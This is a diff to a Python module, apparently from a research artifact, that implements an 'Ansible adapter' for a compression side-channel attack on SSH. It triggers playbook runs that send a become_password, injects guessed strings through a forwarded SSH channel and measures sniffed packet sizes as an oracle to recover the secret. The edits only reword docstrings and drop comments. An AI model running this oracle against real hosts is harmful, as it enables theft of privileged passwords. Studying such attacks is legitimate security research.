@@ -1,12 +1,12 @@
-"""Ansible adapter — fresh SSH per guess.
+"""Ansible adapter (Section 5.3) -- fresh SSH per guess.
 
 Each oracle query triggers a fresh ansible-playbook run on the client
-via /send_secret_ansible, then opens a direct-tcpip channel through
-the already-live SSH connection via the client's Ansible LocalForward
-port. No flush is needed — the fresh SSH connection starts with an
-empty zlib window.
+via /send_secret_ansible, then opens a direct-tcpip channel through the
+already-live SSH connection via the client's Ansible LocalForward port.
+No flush is needed -- the fresh SSH connection starts with an empty
+zlib window.
 
-Ordering per oracle query (preserved from attacker/attack_ansible.py):
+Ordering per oracle query:
   1. Trigger ansible-playbook run (blocks until "Sending become_password").
   2. Open the measure tunnel (direct-tcpip CHANNEL_OPEN).
   3. Settle so CHANNEL_OPEN reaches the sniffer.
@@ -56,24 +56,20 @@ class AnsibleAdapter:
         cfg = self._config
         assert cfg is not None and self._session is not None
 
-        # 1. Trigger ansible-playbook run (blocks until password in flight)
         async with self._session.post(f"{CLIENT_BASE}/send_secret_ansible") as r:
             body = await r.json()
             if not body.get("ok", False):
                 raise RuntimeError(f"send_secret_ansible failed: {body}")
 
-        # 2. Open measure tunnel
         try:
             _, mw = await _open_ansible_tunnel()
         except OSError as exc:
             LOG.warning("ansible measure open failed: %s", exc)
             return 0
 
-        # 3. Settle so CHANNEL_OPEN reaches the sniffer
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
-        # 4-7. Clear, write guess, settle, read
         self._packet_log.clear()
         try:
             mw.write(prefix + candidate + alignment)
@@ -86,7 +82,6 @@ class AnsibleAdapter:
             self._packet_log.snapshot(), cfg.measurement_min_segment_size,
         )
 
-        # 8. Close
         try:
             mw.close()
         except Exception:  # noqa: BLE001
